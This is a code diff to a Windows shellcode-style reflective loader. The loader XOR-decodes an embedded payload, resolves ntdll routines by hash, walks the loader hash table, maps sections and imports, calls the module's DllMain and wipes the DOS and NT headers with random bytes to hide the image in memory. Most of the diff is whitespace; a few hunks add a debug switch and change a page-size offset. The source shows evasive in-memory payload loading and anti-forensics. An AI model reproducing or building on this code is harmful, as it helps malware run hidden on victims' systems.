@@ -7,7 +7,6 @@
 		4. cool ascii art
 */
 
-
 #pragma once
 #include <Windows.h>
 #include <winnt.h>
@@ -22,13 +21,10 @@ constexpr DWORD TAG_PAYLOAD_BEGIN = 'L41N';
 constexpr DWORD TAG_PAYLOAD_KEY = 'd00t';
 constexpr DWORD TAG_PAYLOAD_VAL = TAG_PAYLOAD_BEGIN ^ TAG_PAYLOAD_KEY;
 #define IS_TAG_MAGIC( x ) ((x ^ TAG_PAYLOAD_KEY) == TAG_PAYLOAD_VAL)
-
 #define MAXIMUM_HEADER_SEARCH_BYTES 0x3000
-
 #define ERROR_HDR_NOT_FOUND -1
 #define ERROR_LOADER_INIT_FAILED -2
 
-typedef BOOL(WINAPI* pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
 typedef BOOL(WINAPI* pDllMain)(HINSTANCE, DWORD, LPVOID);
 
 // ntdll
@@ -72,10 +68,11 @@ __declspec(code_seg(".shlc"))
 __declspec(guard(ignore))
 __declspec(safebuffers)
 uintptr_t load(uintptr_t current_base) {
+	uintptr_t old_base_addr = current_base;
 
+#ifndef _LOADER_DEBUG
 	DWORD cbXorHeaderOffset = 0;
 	DWORD dwLenPayload = 0;
-	uintptr_t old_base_addr = current_base;
 	DWORD dwTagOffset = 0;
 	DWORD dwXorKeyLen = 0;
 	PBYTE pXorKey = NULL;
@@ -99,6 +96,7 @@ uintptr_t load(uintptr_t current_base) {
 		return ERROR_HDR_NOT_FOUND;
 	}
 
+
 	// xor decode the payload
 	if (dwXorKeyLen > 0) {
 		for (size_t i = 0; i < dwLenPayload; i++)
@@ -106,6 +104,7 @@ uintptr_t load(uintptr_t current_base) {
 			((PBYTE)old_base_addr)[i] ^= pXorKey[i % dwXorKeyLen];
 		}
 	}
+#endif
 
 	// begin initialize loader data
 	uintptr_t ntbase = (uintptr_t)getNtdll();
@@ -186,11 +185,11 @@ uintptr_t load(uintptr_t current_base) {
 	======================================================
 	*/
 
-	
+
 	stubNtProtectVirtualMemory = (pNtProtectVirtualMemory)get_from_ldr_data(&ldrNtdll, cdwNtProtectVirtualMemory);
 	if (!stubNtProtectVirtualMemory)
 		return -42;
-	
+
 	stubNtQuerySystemInformation = (pNtQuerySystemInformation)get_from_ldr_data(&ldrNtdll, cdwNtQuerySystemInformation);
 	if (!stubNtQuerySystemInformation)
 		return -44;
@@ -304,7 +303,7 @@ uintptr_t load(uintptr_t current_base) {
 		return status;
 	}
 
-	dwPageSize = *(DWORD*)(sbi.Reserved1 + 2);
+	dwPageSize = *(DWORD*)(sbi.Reserved1 + 8);
 	size_t alignedImageSize = AlignValueUp(_old_nt_hdr->OptionalHeader.SizeOfImage, dwPageSize);
 	if (alignedImageSize != AlignValueUp(lastSectionEnd, dwPageSize)) {
 		return -9;
@@ -395,10 +394,10 @@ uintptr_t load(uintptr_t current_base) {
 	for (size_t i = 0; i < _new_nt_hdr->FileHeader.NumberOfSections; i++, pSectionHdr++) {
 		if (pSectionHdr->SizeOfRawData == 0) {
 			size_t section_size = _old_nt_hdr->OptionalHeader.SectionAlignment; // opt
-			
+
 			szAllocation = section_size;
 			szAllocationBase = ((uintptr_t)new_module_base + pSectionHdr->VirtualAddress);
-			
+
 			if (section_size) {
 				status = stubNtAllocateVirtualMemory(
 					hCurrentProcess,
@@ -495,7 +494,7 @@ uintptr_t load(uintptr_t current_base) {
 			// walking the LdrpHashTable
 			if (pLdrpHashTable)
 			{
-				ULONG ulHashTableOffset = mhModuleHash & 0x1f;		
+				ULONG ulHashTableOffset = mhModuleHash & 0x1f;
 				PVOID pHashTableData = pLdrpHashTable[ulHashTableOffset].Flink;
 				// if it is loaded, the pointer to the list entry should not equal it's Flink or Blink
 				if (pHashTableData != *(PVOID*)pHashTableData) {
@@ -507,7 +506,7 @@ uintptr_t load(uintptr_t current_base) {
 			}
 
 			// otherwise, load it with LdrLoadDll
-			if(!loadedModule) {
+			if (!loadedModule) {
 				stubRtlInitAnsiString(&astrFunc, (PCSZ)importName);
 				stubRtlAnsiStringToUnicodeString(&UnicodeString, &astrFunc, TRUE);
 				status = stubLdrLoadDll(NULL, NULL, &UnicodeString, (PHANDLE)&loadedModule);
@@ -524,7 +523,7 @@ uintptr_t load(uintptr_t current_base) {
 #ifdef _LOADER_DEBUG
 			printf("%s - %p\n", importName, loadedModule);
 #endif
-			
+
 
 			// Walk through all of the imports this dll has
 			PIMAGE_THUNK_DATA pImgThunk = (PIMAGE_THUNK_DATA)(_import->FirstThunk + (uintptr_t)new_module_base);
@@ -639,10 +638,10 @@ uintptr_t load(uintptr_t current_base) {
 			PVOID lpBase = (PVOID)((uintptr_t)new_module_base + section->VirtualAddress);
 			SIZE_T ulAllocationSize = section->SizeOfRawData;
 			status = stubNtProtectVirtualMemory(
-				hCurrentProcess, 
-				&lpBase, 
-				&ulAllocationSize, 
-				protect, 
+				hCurrentProcess,
+				&lpBase,
+				&ulAllocationSize,
+				protect,
 				&protect
 			);
 			if (!NT_SUCCESS(status)) {
@@ -695,7 +694,7 @@ uintptr_t load(uintptr_t current_base) {
 
 	uintptr_t entrypoint = _new_nt_hdr->OptionalHeader.AddressOfEntryPoint + (uintptr_t)new_module_base;
 	pDllMain stubDllMain = (pDllMain)(entrypoint);
-	
+
 	// Fill DOS and NT headers with garbage
 	WORD tmpRand = 0;
 	size_t szAllHeaders = ((uintptr_t)_new_nt_hdr + sizeof(IMAGE_NT_HEADERS)) - (uintptr_t)_new_dos_hdr;
@@ -706,7 +705,7 @@ uintptr_t load(uintptr_t current_base) {
 		}
 		else {
 			((PBYTE)_new_dos_hdr)[i] = ((PBYTE)&tmpRand)[0];
-		}	
+		}
 #ifdef _LOADER_DEBUG
 		printf(" %x", ((PBYTE)_new_dos_hdr)[i]);
 #endif
